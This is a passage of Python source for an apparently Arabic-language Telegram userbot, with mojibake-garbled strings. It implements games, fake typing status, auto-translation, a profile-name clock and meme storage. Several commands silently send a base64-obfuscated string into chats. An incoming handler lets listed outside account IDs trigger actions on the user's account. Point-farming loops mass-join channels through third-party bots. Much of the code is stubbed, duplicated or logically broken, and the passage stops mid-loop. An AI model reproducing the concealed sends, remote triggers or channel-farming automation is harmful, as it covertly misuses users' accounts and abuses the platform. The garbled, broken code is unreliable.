    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ™ŸÜÿ∏ŸäŸÅ ÿ¥ÿπÿ±ŸÉ ÿ®ÿ≥ÿßÿ¶ŸÑ ÿ∫ÿ≥ŸäŸÑ ÿßŸÑÿ£ÿ∑ÿ®ÿßŸÇ Ÿàÿ®ŸäŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÉÿ±ŸäŸÖ ÿßŸÑÿ£ÿ≥ÿßÿ≥ ŸÑÿ∫ÿ≥ŸäŸÑ ÿßŸÑÿ£ÿ∑ÿ®ÿßŸÇÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÖÿ¥ÿßŸáÿØÿ© ÿßŸÑÿØÿ±ÿßŸÖÿß ŸÅŸä ÿ£ŸäÿßŸÖ ÿßŸÑÿ≥ÿ®ÿπŸäŸÜŸäÿßÿ™ ÿ£Ÿà ŸÖÿ¥ÿßŸáÿØÿ© ÿßŸÑÿ£ÿπŸÖÿßŸÑ ÿßŸÑÿØÿ±ÿßŸÖŸäÿ© ŸÑŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸäÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßŸÖÿ™ŸÑÿßŸÉ ÿßŸÑŸÇÿØÿ±ÿ© ÿπŸÑŸâ ÿ™ÿ∫ŸäŸäÿ± ŸÑŸàŸÜ ÿ¥ÿπÿ±ŸÉ ŸÖÿ™Ÿâ ÿ™ÿ±ŸäÿØŸäŸÜ Ÿàÿ®ŸäŸÜ ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ŸÖŸÉŸäÿßÿ¨ ŸÖŸÜ ŸÇÿ®ŸÑ ÿÆÿ®Ÿäÿ± ÿ™ÿ¨ŸÖŸäŸÑ Ÿàÿ∞ŸÑŸÉ ÿ®ÿ¥ŸÉŸÑ ŸäŸàŸÖŸäÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿßŸÑÿ•ÿ®ÿ≠ÿßÿ± ŸÑŸÖÿØÿ© ÿ£ÿ≥ÿ®Ÿàÿπ ŸÉÿßŸÖŸÑ ÿ£Ÿà ÿßŸÑÿ≥ŸÅÿ± ÿπŸÑŸâ ŸÖÿ™ŸÜ ÿ∑ÿßÿ¶ÿ±ÿ© ŸÑŸÄ 3 ÿ£ŸäÿßŸÖ ŸÖÿ™ŸàÿßÿµŸÑÿ©ÿü! **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ£ŸÜ ÿ™ÿµÿ®ÿ≠Ÿä ÿπÿßÿ±ÿ∂ÿ© ÿ£ÿ≤Ÿäÿßÿ° Ÿàÿ®ŸäŸÜ ŸÖŸäŸÉ ÿ¢ÿ® ÿ£ÿ±ÿ™Ÿäÿ≥ÿ™ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ™ŸÜÿßŸàŸÑ ÿßŸÑÿ¥ŸàŸÉŸàŸÑÿß ÿßŸÑÿ™Ÿä ÿ™ÿ≠ÿ®ŸäŸÜ ÿ∑ŸàÿßŸÑ ÿ≠Ÿäÿßÿ™ŸÉ ŸàŸÑŸÉŸÜ ŸÑÿß ŸäŸÖŸÉŸÜŸÉ ÿßŸÑÿßÿ≥ÿ™ŸÖÿßÿπ ÿ•ŸÑŸâ ÿßŸÑŸÖŸàÿ≥ŸäŸÇŸâ Ÿàÿ®ŸäŸÜ ÿßŸÑÿßÿ≥ÿ™ŸÖÿßÿπ ÿ•ŸÑŸâ ÿßŸÑŸÖŸàÿ≥ŸäŸÇŸâ ŸàŸÑŸÉŸÜ ŸÑÿß ŸäŸÖŸÉŸÜ ŸÑŸÉ ÿ™ŸÜÿßŸàŸÑ ÿßŸÑÿ¥ŸàŸÉŸàŸÑÿß ÿ£ÿ®ÿØŸãÿßÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ≤Ÿàÿ¨ÿ™ŸÉ Ÿàÿßÿ®ŸÜŸÉ/ÿßÿ®ŸÜÿ™ŸÉÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ•ŸÖÿß ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ÿßŸÑŸÖÿßŸÑ ÿ£Ÿà ÿπŸÑŸâ ÿßŸÑŸÖÿ≤ŸäÿØ ŸÖŸÜ ÿßŸÑŸàŸÇÿ™ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ¥ÿ±ÿßÿ° ŸÖŸÜÿ≤ŸÑ ÿµÿ∫Ÿäÿ± ÿ£Ÿà ÿßÿ≥ÿ™ÿ¶ÿ¨ÿßÿ± ŸÅŸäŸÑÿß ŸÉÿ®Ÿäÿ±ÿ© ÿ®ŸÖÿ®ŸÑÿ∫ ŸÖÿπŸÇŸàŸÑÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ£ŸÖŸÉ Ÿàÿ£ÿ®ŸäŸÉÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ÿ•ŸÜŸáÿßÿ° ÿßŸÑÿ≠ÿ±Ÿàÿ® ŸÅŸä ÿßŸÑÿπÿßŸÑŸÖ ÿ£Ÿà ÿ•ŸÜŸáÿßÿ° ÿßŸÑÿ¨Ÿàÿπ ŸÅŸä ÿßŸÑÿπÿßŸÑŸÖÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÜÿ¥ÿ± ÿ™ŸÅÿßÿµŸäŸÑ ÿ≠Ÿäÿßÿ™ŸÉ ÿßŸÑŸÖÿßŸÑŸäÿ© Ÿàÿ®ŸäŸÜ ŸÜÿ¥ÿ± ÿ™ŸÅÿßÿµŸäŸÑ ÿ≠Ÿäÿßÿ™ŸÉ ÿßŸÑÿπÿßÿ∑ŸÅŸäÿ©ÿü **",
    "** ŸÑŸà ÿÆŸäÿ±ŸàŸÉ |  ÿ®ŸäŸÜ ŸÇÿ∂ÿßÿ° ŸäŸàŸÖ ŸÉÿßŸÖŸÑ ŸÖÿπ ÿßŸÑÿ±Ÿäÿßÿ∂Ÿä ÿßŸÑÿ∞Ÿä ÿ™ÿ¥ÿ¨ÿπŸá ÿ£Ÿà ŸÜÿ¨ŸÖ ÿßŸÑÿ≥ŸäŸÜŸÖÿß ÿßŸÑÿ∞Ÿä ÿ™ÿ≠ÿ®Ÿáÿü **",

]


@client.on(events.NewMessage(pattern=".ÿÆŸäÿ±ŸàŸÉ$"))
async def ithker(knopis):
    await knopis.edit(random.choice(HuRe_5erok))

@client.on(events.NewMessage(outgoing=True, pattern="ŸáÿßŸÉ"))
async def repo(event):
    if event.fwd_from:
        return
    lMl10l = Config.TG_BOT_USERNAME
    if event.reply_to_msg_id:
        await event.get_reply_message()
    await bot.send_message(lMl10l, "/hack")
    response = await bot.inline_query(lMl10l, "ŸáÿßŸÉ")
    await response[0].click(event.chat_id)
    await event.delete()
    
file_path = "installation_date.txt"
if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
    with open(file_path, "r") as file:
        installation_time = file.read().strip()
else:
    installation_time = datetime.now().strftime("%Y-%m-%d")
    with open(file_path, "w") as file:
        file.write(installation_time)

@client.on(events.NewMessage(pattern="ÿµŸàÿ™Ÿäÿ©(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑÿßŸÖÿ± ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠**")
    await event.edit(f"**ÿ™ŸÖ ÿ®ÿØÿ° Ÿàÿ∂ÿπ ÿßÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ™Ÿäÿ© ÿßŸÑŸàŸáŸÖŸäÿ© ŸÑŸÄ {t} ŸÖŸÜ ÿßŸÑÿ´ŸàÿßŸÜŸÄŸä**")
    async with event.client.action(event.chat_id, "record-audio"):
        await asyncio.sleep(t)


@client.on(events.NewMessage(pattern="ŸÅŸäÿØ(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑÿßŸÖÿ± ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠**")
    await event.edit(f"**ÿ™ŸÖ ÿ®ÿØÿ° Ÿàÿ∂ÿπ ÿßÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÅŸäÿØŸäŸà ÿßŸÑŸàŸáŸÖŸä ŸÑŸÄ {t} ŸÖŸÜ ÿßŸÑÿ´ŸàÿßŸÜŸÄŸä**")
    async with event.client.action(event.chat_id, "record-video"):
        await asyncio.sleep(t)


@client.on(events.NewMessage(pattern="ŸÑÿπÿ®ÿ©(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- Ÿäÿ¨ÿ® ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑÿßŸÖÿ± ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠**")
    await event.edit(f"**ÿ™ŸÖ ÿ®ÿØÿ° Ÿàÿ∂ÿπ ÿßŸÑŸÑÿπÿ® ÿßŸÑŸàŸáŸÖŸä ŸÑŸÄ {t} ŸÖŸÜ ÿßŸÑÿ´ŸàÿßŸÜŸÄŸä**")
    async with event.client.action(event.chat_id, "game"):
        await asyncio.sleep(t)

from googletrans import Translator

translator = Translator()

tr_status = {}

@client.on(events.NewMessage(outgoing=True, pattern=".ŸÖÿ™ÿ±ÿ¨ŸÖ (.*)"))
async def start_translate(event):
    if event.fwd_from:
        return
    lang = event.pattern_match.group(1).strip()
    chat_id = event.chat_id
    tr_status[chat_id] = lang
    await event.edit(f"**ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÑŸÖÿ™ÿ±ÿ¨ŸÖ ÿ•ŸÑŸâ ÿßŸÑŸÑÿ∫ÿ©: {lang}**", parse_mode="md")

@client.on(events.NewMessage)
async def auto_translate(event):
    if event.fwd_from:
        return
    chat_id = event.chat_id
    if chat_id in tr_status:
        lang = tr_status[chat_id]
        try:
            translated = await translator.translate(event.message.message, dest=lang)
            await event.edit(translated.text, parse_mode="md")
        except Exception as exc:
            print(f"ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ™ÿ±ÿ¨ŸÖÿ©: {exc}")

@client.on(events.NewMessage(outgoing=True, pattern='.ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÜÿ¥ÿ±'))
async def stop_final(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    global final
    final = False
    await event.edit("**‚ñ™Ô∏é|ÿ™ŸÖ ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ÿ®ŸÜÿ¨ÿßÿ≠.**", parse_mode="md")

update_tasks = {}
time_formats = {
    "1": "ùüèùüêùüëùüíùüìùüîùüïùüñùüóùüé",
    "2": "ùü∑ùü∏ùüπùü∫ùüªùüºùüΩùüæùüøùü∂",
    "3": "ùü£ùü§ùü•ùü¶ùüßùü®ùü©ùü™ùü´ùü¢",
    "4": "ùü≠ùüÆùüØùü∞ùü±ùü≤ùü≥ùü¥ùüµùü¨",
    "5": "ùü∑ùü∏ùüπùü∫ùüªùüºùüΩùüæùüøùü∂",
    "6": "€±€≤€≥€¥€µ€∂€∑€∏€π€∞",
    "7": "Ÿ°Ÿ¢Ÿ£Ÿ§Ÿ•Ÿ¶ŸßŸ®Ÿ©Ÿ†",
    "8": "‚ÇÅ‚ÇÇ‚ÇÉ‚ÇÑ‚ÇÖ‚ÇÜ‚Çá‚Çà‚Çâ‚ÇÄ",
    "9": "‚ìµ‚ì∂‚ì∑‚ì∏‚ìπ‚ì∫‚ìª‚ìº‚ìΩ‚ì™",
    "10": "ùüôùüöùüõùüúùüùùüûùüüùü†ùü°ùüò",
    "11": "‚ù∂‚ù∑‚ù∏‚ùπ‚ù∫‚ùª‚ùº‚ùΩ‚ùæ‚ìø"
}

current_time_format = "1"

async def update_name_periodically(event, user_name, timezone_str): 
    chat_id = event.chat_id
    timezone = pytz.timezone(timezone_str)  
    await event.delete() 
    while True:
        now = datetime.now(timezone)
        formatted_time = now.strftime('%I:%M')
        original_chars = "1234567890"
        formatted_chars = time_formats[current_time_format]
        for i in range(len(original_chars)):
            formatted_time = formatted_time.replace(original_chars[i], formatted_chars[i])
        try:
            await event.client(UpdateProfileRequest(last_name=formatted_time)) 
        except Exception as ex:
            print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(ex)}")
        await asyncio.sleep(55)
        if chat_id in update_tasks and not update_tasks[chat_id]:
            break

@client.on(events.NewMessage(pattern=r"\.ÿßÿ≥ŸÖŸä \| (.+)", outgoing=True))
async def change_name_with_time(event):
    timezone_str = event.pattern_match.group(1) 
    chat_id = event.chat_id
    update_tasks[chat_id] = True
    me = await client.get_me()
    user_name = me.first_name
    asyncio.ensure_future(update_name_periodically(event, user_name, timezone_str))

@client.on(events.NewMessage(pattern=r"\.ÿßŸäŸÇÿßŸÅ ÿßÿ≥ŸÖŸä$", outgoing=True))
async def stop_name_update(event):
    chat_id = event.chat_id
    if chat_id in update_tasks:
        update_tasks[chat_id] = False
        try:
            await event.client(UpdateProfileRequest(last_name="")) 
        except Exception as ex:
            print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(ex)}")
        await event.delete() 

@client.on(events.NewMessage(pattern=r"\.ÿßŸÑÿßÿ¥ŸÉÿßŸÑ$", outgoing=True))
async def show_time_formats(event):
    formats_text = "\n".join([f"{key}: {value}" for key, value in time_formats.items()])
    await event.respond(f"**ÿßÿÆÿ™ÿßÿ± ÿßŸä ŸÜŸàÿπ ŸÖŸÜ ŸáÿßŸä ÿßŸÑÿßÿ¥ŸÉÿßŸÑ ÿßŸÑŸä ÿ™ÿπÿ¨ÿ®ŸÉ:**\n\n{formats_text}")
    await event.delete()

@client.on(events.NewMessage(pattern=r"\.ÿßŸÑÿ¥ŸÉŸÑ (\d+)", outgoing=True))
async def change_time_format(event):
    global current_time_format
    try:
        format_key = event.pattern_match.group(1)
        if format_key in time_formats:
            current_time_format = format_key
            await event.respond(f"ÿ™ŸÖ ÿ™ÿ∫ŸäŸäÿ± ÿ¥ŸÉŸÑ ÿßŸÑŸàŸÇÿ™ ÿ•ŸÑŸâ {format_key}")
        else:
            await event.respond("ÿ¥ŸÉŸÑ ÿßŸÑŸàŸÇÿ™ ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ.")
    except Exception as e:
        print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {str(e)}")
    await event.delete()


def add_link(lMl10l, url):
    
    pass


def Get(joker):
    # ŸÉŸàÿØ ÿßŸÑÿØÿßŸÑÿ© ŸáŸÜÿß
    return joker

@client.on(events.NewMessage(outgoing=True, pattern=r"ŸÖŸäŸÖÿ≤ (\S+) (.+)"))
async def Hussein(event):
    url = event.pattern_match.group(1)
    lMl10l = event.pattern_match.group(2)
    
    # ÿ™ÿπÿ±ŸäŸÅ ÿØÿßŸÑÿ© add_link
    def add_link(lMl10l, url):
        # ŸÉŸàÿØ ÿßŸÑÿØÿßŸÑÿ© ŸáŸÜÿß
        pass
    
    add_link(lMl10l, url)
    
    await event.edit(f"‚éôÔ∏ô ÿ™ŸÖ ÿßÿ∂ÿßŸÅÿ© ÿßŸÑÿ®ÿµŸÖÿ© {lMl10l} ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì ")
    
    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    joker = Get(joker)
    try:
        await event.client.send_message(event.chat_id, joker)
    except BaseException:
        pass
    
@client.on(events.NewMessage(outgoing=True, pattern=r"\?(.*)"))
async def Hussein(event):
    lMl10l = event.pattern_match.group(1)
    Joker = await reply_id(event)
    url = get_link(lMl10l)
    
    if url:
        await event.client.send_file(event.chat_id, url, parse_mode="html", reply_to=Joker)
        await event.delete()
    
    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    joker = Get(joker)  # ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿØÿßŸÑÿ© Get ŸáŸÜÿß
    try:
        await event.client.send_message(event.chat_id, joker)
    except BaseException:
        pass



def Get(joker):
    # ŸÉŸàÿØ ÿßŸÑÿØÿßŸÑÿ© ŸáŸÜÿß
    return joker




engine = create_engine('sqlite:///aljoker.db')


Base = declarative_base()

class AljokerLink(Base):
    __tablename__ = 'aljoker_links'
    id = Column(Integer, primary_key=True)
    key = Column(String)
    url = Column(String)


Base.metadata.create_all(engine)


def Get(joker):
    # ŸÉŸàÿØ ÿßŸÑÿØÿßŸÑÿ© ŸáŸÜÿß
    return joker


def get_link(key):
    # ŸÉŸàÿØ ÿßŸÑÿØÿßŸÑÿ© ŸáŸÜÿß
    return "ÿßŸÑÿ±ÿßÿ®ÿ∑"


async def reply_id(event):
    # ŸÉŸàÿØ ÿßŸÑÿØÿßŸÑÿ© ŸáŸÜÿß
    return event.reply_to_msg_id

@client.on(events.NewMessage(outgoing=True, pattern="ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖŸäŸÖÿ≤"))
async def list_aljoker(event):
    Session = sessionmaker(bind=engine)
    session = Session()
    links = session.query(AljokerLink).all()
    if links:
        message = "**‚éôÔ∏ô ŸÇÿßÿ¶ŸÖÿ© ÿ™ÿÆÿ≤ŸäŸÜ ÿßŸàÿßŸÖÿ± ÿßŸÑŸÖŸäŸÖÿ≤:**\n"
        for link in links:
            message += f"- ÿßŸÑÿ®ÿµŸÖÿ© : .`{link.key}`\n"
    else:
        message = "**‚éôÔ∏ô ŸÑÿßÿ™Ÿàÿ¨ÿØ ÿ®ÿµŸÖÿßÿ™ ŸÖŸäŸÖÿ≤ ŸÖÿÆÿ≤ŸàŸÜÿ© ÿ≠ÿ™Ÿâ ÿßŸÑÿ¢ŸÜ**"
    await event.edit(message)
    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    joker = Get(joker)
    try:
        await event.client.send_message(event.chat_id, joker)
    except BaseException:
        pass
 
@client.on(events.NewMessage(pattern="ÿ∑ŸÑÿßŸÉ(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(event, f"**‚éôÔ∏ô ÿßŸÜÿ™Ÿê ÿ∑ÿßŸÑŸÇ ÿ∑ÿßŸÑŸÇ ÿ∑ÿßŸÑŸÇ üôéüèª‚Äç‚ôÇÔ∏è ŸÖŸÜ :**{my_mention} .\n**‚éôÔ∏ô ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ŸÑÿßŸÇŸáÿß ÿ®ŸÑÿ´ŸÑÿßÿ´ ŸàŸÅÿ≥ÿÆ ÿ≤Ÿàÿßÿ¨ŸÉŸÖÿß ÿßŸÑÿßŸÜ ÿßŸÑŸÉŸÑ ÿ≠ÿ± ÿ∑ŸÑŸäŸÇ ** ")
    lMl10l = [8115539074, 8115539074, 8115539074, 8115539074]                     
           
@client.on(events.NewMessage(outgoing=True,  pattern=r"^\.ŸÅÿßŸÉ$"))
async def fuck(event):
	await event.edit("‚îè‚îÅ‚î≥‚î≥‚î≥‚îÅ‚î≥‚î≥‚îì\n‚îÉ‚îÅ‚î´‚îÉ‚îÉ‚îè‚î´‚îÅ‚î´‚îè‚îì\n‚îÉ‚îè‚î´‚îÉ‚îÉ‚îó‚î´‚îÉ‚îÉ‚îÉ‚îÉ\n‚îó‚îõ‚îó‚îÅ‚îª‚îÅ‚îª‚îª‚îõ‚îÉ‚îÉ\n‚îè‚î≥‚î≥‚îÅ‚î≥‚î≥‚î≥‚îì‚îè‚î´‚î£‚î≥‚îì\n‚î£‚îì‚îÉ‚îÉ‚îÉ‚îÉ‚î£‚î´‚îÉ‚îè‚îª‚îª‚î´\n‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚îÉ‚î£‚îª‚î´‚îÉ‚îÉ\n‚îó‚îÅ‚îª‚îÅ‚îª‚îÅ‚îª‚îõ‚îó‚îÅ‚îÅ‚îÅ‚îõ")

@client.on(events.NewMessage(outgoing=True,  pattern=r"^\.ÿßÿ®ÿ±Ÿá$"))
async def fuck(event):
	await event.edit(f"‚îÄ‚îÄ‚îÄ‚îÄ‚ñÑ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà‚îÄ‚ñà\n‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚ñÄ‚ñà\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚îÄ‚ñÄ\n\n")
	

c = requests.session()
bot_username = '@EEObot'
bot_username2 = '@A_MAN9300BOT'
bot_username3 = '@MARKTEBOT'
bot_username4 = '@qweqwe1919bot'
bot_username5 = '@xnsex21bot'
bot_username6 = '@DamKombot'
bot_username8 = '@Bellllen192BOT'
bot_username9 = '@AL2QRPBOT'
bot_username10 = '@PPAHSBOT'
bot_username11 = '@DamKombot'
JoKeRUB = ['yes']
its_Reham = False
its_hussein = False
its_reda = False
its_joker = False
#ÿßŸäÿßÿ´ÿßÿ±ÿßÿ™ ÿßŸÑÿ≠ÿ≥ŸäŸÜ
#by Aljoker doesn't steal codes Please
@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ CR7|ÿ™ÿ¨ŸÖŸäÿπ ŸÉÿ±ÿ≥ÿ™ŸäÿßŸÜŸà)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ CR7 , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@PPAHSBOT')
    await event.client.send_message('@PPAHSBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@PPAHSBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@PPAHSBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@PPAHSBOT', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@PPAHSBOT'  # ÿßÿ≥ÿ™ÿ®ÿØŸÑ '@ŸäŸàÿ≤ÿ±_ÿßŸÑÿ®Ÿàÿ™' ÿ®ŸäŸàÿ≤ÿ± ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØŸá
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    
@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπŸÇÿ±ÿ®|ÿ™ÿ¨ŸÖŸäÿπ ÿπŸÇÿ±ÿ®)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑÿπŸÇÿ±ÿ® , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@AL2QRPBOT')
    await event.client.send_message('@AL2QRPBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@AL2QRPBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@AL2QRPBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
